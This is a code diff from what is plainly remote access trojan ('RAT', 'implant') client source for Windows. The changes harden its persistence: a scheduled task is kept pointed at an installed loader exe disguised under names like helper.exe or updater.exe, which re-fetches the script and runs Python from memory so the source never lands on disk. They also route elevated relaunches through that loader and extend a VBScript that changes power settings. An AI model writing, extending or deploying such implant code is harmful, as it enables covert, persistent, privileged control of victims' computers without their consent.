@@ -1788,21 +1788,43 @@ def _wake_arm() -> str:
     return "[+] wake armed (flag set; task re-register failed)"
 
 
+def _loader_exe_path() -> str:
+    """Installed loader exe path (RAT_SOURCE=1 mode). The loader owns
+    persistence: it copies itself to %USERPROFILE%\\.cache\\<name> and on
+    every run re-fetches client.py + boots python from RAM. Only that exe
+    can re-boot the implant - the embedded python.exe is useless without
+    the script piped on stdin."""
+    root = os.environ.get("RAT_PYROOT") or _base_dir()
+    if not root:
+        return ""
+    # loader_py v3 hardcodes INSTALL_NAME=helper.exe - prefer it, then the
+    # legacy self-install names (runtime.exe/updater.exe) as fallback.
+    names = ["helper.exe"] + [n for n in INSTALL_NAME_CANDIDATES
+                              if n.lower() != "helper.exe"]
+    for name in names:
+        p = os.path.join(root, INSTALL_DIR_NAME, name)
+        if os.path.exists(p):
+            return p
+    return ""
+
+
 def _persistence_exe() -> str:
     """Path the persistence task should run. Under RAT_SOURCE=1 (loader
     mode) GetModuleFileNameW(NULL) resolves to the temporary python.exe in
     the loader's pyXXXXXXXX dir, which the loader deletes - re-registering
     the task to that path would brick persistence. Prefer the LOADER exe
-    recorded in the existing task's XML; fall back to the module path."""
+    recorded in the existing task's XML; fall back to the installed loader
+    exe, then the module path."""
     if os.name != "nt" or os.environ.get("RAT_SOURCE") != "1":
         return _module_exe_path()
+    fallback = lambda: _loader_exe_path() or _module_exe_path()
     try:
         import ctypes
         import re
         import xml.sax.saxutils as _sx
         handles = _ts_open()
         if not handles:
-            return _module_exe_path()
+            return fallback()
         svc, folder = handles
         try:
             get = _com_slot(folder, 13, ctypes.c_wchar_p,   # ITaskFolder::GetTask
@@ -1810,20 +1832,20 @@ def _persistence_exe() -> str:
             task = ctypes.c_void_p()
             if get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
                    ctypes.byref(task)) != 0 or not task.value:
-                return _module_exe_path()
+                return fallback()
             try:
                 xml_get = _com_slot(task, 19,        # IRegisteredTask::get_Xml
                                     ctypes.POINTER(ctypes.c_void_p))
                 bstr = ctypes.c_void_p()
                 if xml_get(task, ctypes.byref(bstr)) != 0 or not bstr.value:
-                    return _module_exe_path()
+                    return fallback()
                 try:
                     xml = ctypes.cast(bstr, ctypes.c_wchar_p).value or ""
                 finally:
                     ctypes.windll.oleaut32.SysFreeString(bstr)
                 m = re.search(r"<Command>(.*?)</Command>", xml, re.S)
                 if not m:
-                    return _module_exe_path()
+                    return fallback()
                 path = _sx.unescape(
                     m.group(1), {"&quot;": '"', "&apos;": "'"})
                 if path and os.path.exists(path):
@@ -1834,7 +1856,7 @@ def _persistence_exe() -> str:
             _ts_release(svc, folder)
     except Exception:
         pass
-    return _module_exe_path()
+    return fallback()
 
 
 def _elevate_respawn() -> str:
@@ -2030,11 +2052,17 @@ def _elev_launch_cmd() -> str:
         return ""
     frozen = getattr(sys, "frozen", False) or "__compiled__" in globals()
     if os.environ.get("RAT_SOURCE") == "1":
-        exe = _persistence_exe()
+        # Loader mode: the implant is python.exe reading client.py from
+        # stdin (source never on disk). A bare python.exe relaunch is
+        # useless - launch the installed LOADER exe instead, which
+        # re-fetches client.py and boots python elevated (same path as
+        # on-logon persistence).
+        exe = _loader_exe_path()
         if exe:
             exe = exe.strip().strip('"')
             if exe and os.path.exists(exe):
                 return '"' + exe + '"'
+        return ""
     if frozen:
         exe = _module_exe_path() or get_self_path()
         if exe and os.path.exists(exe):
@@ -2111,6 +2139,8 @@ def request_admin() -> str:
         '  o.Close\r\n'
         'End Sub\r\n'
         'L "start"\r\n'
+        'sh.Environment("Process")("RAT_FAST") = "1"\r\n'
+        'L "RAT_FAST set"\r\n'
         'L "powercfg AC CONSOLELOCK 0 rc=" & '
         'sh.Run("powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
         'CONSOLELOCK 0", 0, True)\r\n'
